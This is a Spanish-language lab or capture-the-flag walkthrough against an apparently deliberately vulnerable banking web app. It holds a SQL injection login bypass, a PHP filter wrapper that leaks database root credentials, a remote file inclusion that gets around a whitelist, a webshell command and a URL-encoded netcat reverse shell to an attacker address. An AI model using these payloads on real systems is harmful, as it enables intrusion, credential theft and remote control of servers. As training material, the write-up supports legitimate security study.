PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos al puerto 80 y nos encontramos un Panel de Login

-Aplicamos una SQL Injection básica:
	-Username: 'or true-- -
	-Password: Whathever
		(Estamos dentro)

-La URL dentro de dashboard es la siguiente:
	-http://192.168.1.141/OnlineBanking/index.php?p=welcome

-Usamos Wrappers para ver el código fuente de los archivos de las secciones:
	-http://192.168.1.143/OnlineBanking/index.php?p=php://filter/convert.base64-encode/resource=balance
		-Lo decodificamos y encontramos unas credenciales mysql:
			$dbServer = mysqli_connect('mysql', 'root', 'TestPass123!', 'HarborBankUsers');
			(Nos las guardamos, luego nos pueden servir)

-Intentamos ver el código fuente del archivo 'index.php' pero no podemos, solo podemos incluir los archivos (home,balance,account y about) , que son las secciones de la web

-Parece que hay una **'Whitelist'** que solo nos permite listar esos archivos

-Probamos un Remote File Inclusion (RFI):
	-http://192.168.1.143/OnlineBanking/index.php?p=http://192.168.1.135/test.php
		NO FUNCIONA 
	-Cómo hay una Whitelist, vamos a probar a **saltarnos el filtro** incluyendo la palabra **'balance'**, que es una de las secciones que nos ha dejado listar con el Wrapper:
		-http://192.168.1.143/OnlineBanking/index.php?p=http://192.168.1.135/balance
			"GET /balance.php HTTP/1.0" 404 -
			(**FUNCIONA**, hemos recibido la conexión!!)

-Por defecto , incluye la extensión '.php', por lo que nos creamos un archivo llamado 'balace.php' con el contenido de una webshell para ejecutar comandos en la máquina:
	-http://192.168.1.144/OnlineBanking/index.php?p=http://192.168.1.135/balance&cmd=id
		**uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)**
		(FUNCIONA!!)
	-Nos mandamos una RS:
		-http://192.168.1.144/OnlineBanking/index.php?p=http://192.168.1.135/balance&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.135%201234%20%3E%2Ftmp%2Ff
			**/var/www/html/OnlineBanking $ whoami**
				**www-data**
				(Usamos la RS de mkfifo (la de /bin/sh)), ya que la máquina tiene una /bin/sh , no una /bin/bash
